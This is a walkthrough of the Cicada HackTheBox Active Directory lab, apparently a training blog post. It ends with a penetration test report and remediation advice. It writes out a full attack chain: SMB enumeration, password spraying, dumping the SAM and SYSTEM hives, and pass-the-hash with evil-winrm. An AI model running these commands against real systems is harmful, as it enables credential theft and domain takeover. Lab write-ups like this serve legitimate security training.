---
title: Cicada HTB — Full Walkthrough
published: 2025-06-28
description: A detailed walkthrough of the Cicada HTB Windows Active Directory box, covering reconnaissance, initial access, privilege escalation, and domain admin takeover.
tags: [HTB, Active Directory, SMB, Privilege Escalation, Windows, CTF]
category: Walkthrough
draft: false
---

# Cicada HTB — Full Walkthrough

**Difficulty:** Easy

**Platform:** HackTheBox

**Target:** Windows (Active Directory)

**Objective:** Gain Domain Admin access and capture flags

## 1. Reconnaissance

Perform a full TCP port scan:  
```bash
nmap -sC -sV -T4 10.10.11.35 -p- -A -o nmapScan.txt
```

**Findings:**  
- Standard AD ports: 445 (SMB), 389 (LDAP), 88 (Kerberos), etc.  
- Identified as an Active Directory environment.

## 2. Initial Access

Enumerate SMB with anonymous access:  
```bash
smbmap -H 10.10.11.35 -u 'anonymous'
```

Access the HR share:  
```bash
smbclient \\\\10.10.11.35\\HR -U "anonymous"
```

**Files Found:**  
- `Notice from HR.txt` (contains password: `Cicada$M6Corpb*@Lp#nZp!8`)

## 3. User Enumeration

Brute force RID to enumerate users:  
```bash
nxc smb 10.10.11.35 -u 'anonymous' -p '' --rid-brute
```

Store usernames in `users.txt`.

Perform password spraying with the found password:  
```bash
nxc smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

**Valid Credentials Found:**  
- **Username:** michael.wrightson  
- **Password:** Cicada$M6Corpb*@Lp#nZp!8

## 4. Further Enumeration

Check additional SMB shares:  
```bash
smbmap -H 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

**Found:** Access to `DEV` share.

Access the `DEV` share:  
```bash
smbclient \\\\10.10.11.35\\DEV -U "michael.wrightson"
```

**Files Found:**  
- `Backup_script.ps1` (contains credentials for `emily.oscars`: `Q!3@Lp#M6b*7t*Vt`)

## 5. Gaining Shell Access

Login using `evil-winrm`:  
```bash
evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

Navigate to Desktop and capture the user flag:  
```bash
cd Desktop
type user.txt
```

## 6. Privilege Escalation

Check privileges:  
```bash
whoami /priv
```

**Finding:** `SeBackupPrivilege` enabled.

Exploit `SeBackupPrivilege` to extract registry hives:  
```bash
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

Download registry files:  
```bash
cd Temp
download sam
download system
```

Extract NTLM hash for Administrator:  
```bash
pypykatz registry --sam sam system
```

Login as Administrator using the NTLM hash:  
```bash
evil-winrm -i 10.10.11.35 -u 'Administrator' -H '<NTLM_HASH>'
```

Capture root flag:  
```bash
cd C:\Users\Administrator\Desktop
type root.txt
```

## Lessons Learned

- Anonymous SMB access can reveal sensitive information like passwords in text files.  
- Password reuse across accounts is a common vulnerability in AD environments.  
- `SeBackupPrivilege` can be exploited to extract critical registry data.  
- Tools like `nxc` and `evil-winrm` are effective for enumeration and lateral movement.  
- Always check scripts and configuration files for hardcoded credentials.  
- Simple misconfigurations can lead to full domain compromise.

## Penetration Test Report

**Client:** HTB

**Engagement:** Penetration Test - Windows Active Directory Environment

**Date:** June 2025

**Consultant:** Hugo Leonor

### 1. Objective

Evaluate the security of the Windows Active Directory environment at `10.10.11.35`, identifying vulnerabilities that could enable privilege escalation and infrastructure compromise, culminating in Domain Admin access.

### 2. Scope

- **Target IP:** 10.10.11.35  
- **Services:** SMB, LDAP, Kerberos, WinRM, and other standard Active Directory services  
- **Initial Access:** Anonymous SMB access  

### 3. Methodology

The approach followed standard stages of an Active Directory penetration test:  
- Reconnaissance using Nmap  
- Enumeration of users and shares via SMB with anonymous and authenticated access  
- Password spraying to identify valid credentials  
- Exploitation of misconfigured privileges (`SeBackupPrivilege`)  
- Extraction of sensitive data from shares and registry hives  
- Lateral movement and privilege escalation to Domain Admin  

### 4. Summary of Findings

| Stage | Key Result | Impact |
|-------|------------|--------|
| Initial Scan | Standard AD ports open (445, 389, 88, etc.) | Normal exposure |
| Anonymous SMB Access | Access to HR share, found password in `Notice from HR.txt` | Initial foothold |
| User Enumeration | Identified valid user: michael.wrightson | Expanded access |
| DEV Share Access | Found `Backup_script.ps1` with credentials for emily.oscars | Lateral movement |
| Shell Access | WinRM access as em Emily.oscars ars, user flag captured | User-level compromise |
| Privilege Escalation | Exploited `SeBackupPrivilege` to extract Administrator NTLM hash | Full domain access |
| Root Flag Capture | Administrator shell, root flag obtained | Total compromise |

### 5. Technical Details

#### 5.1 Reconnaissance and Enumeration

The environment exposed standard AD services. Anonymous SMB access revealed a password in a text file, which was used to authenticate as `michael.wrightson`.

#### 5.2 Initial Access and Enumeration

The `michael.wrightson` account provided access to the `DEV` share, containing a PowerShell script with credentials for `emily.oscars`. These credentials allowed WinRM access and user flag capture.

#### 5.3 Privilege Escalation

The `emily.oscars` account had `SeBackupPrivilege`, which was exploited to extract SAM and SYSTEM registry hives. The Administrator NTLM hash was extracted and used to gain Domain Admin access via `evil-winrm`.

### 6. Impact and Risks

- **Full Domain Compromise:** Domain Admin access grants complete control over the AD infrastructure.  
- **Sensitive Data Exposure:** Passwords in text files and scripts are highly vulnerable.  
- **Misconfigured Privileges:** `SeBackupPrivilege` enabled extraction of critical system data.  
- **Unrestricted Services:** WinRM access facilitated lateral movement and escalation.  

### 7. Recommendations

- Disable anonymous SMB access or restrict it to non-sensitive shares.  
- Avoid storing passwords in plain text or scripts; use secure credential management.  
- Review and restrict sensitive privileges like `SeBackupPrivilege`.  
- Implement monitoring for unauthorized access to shares and privilege abuse.  
- Enforce strong, unique passwords and enable multi-factor authentication.  
- Conduct regular AD audits to identify and remediate misconfigurations.
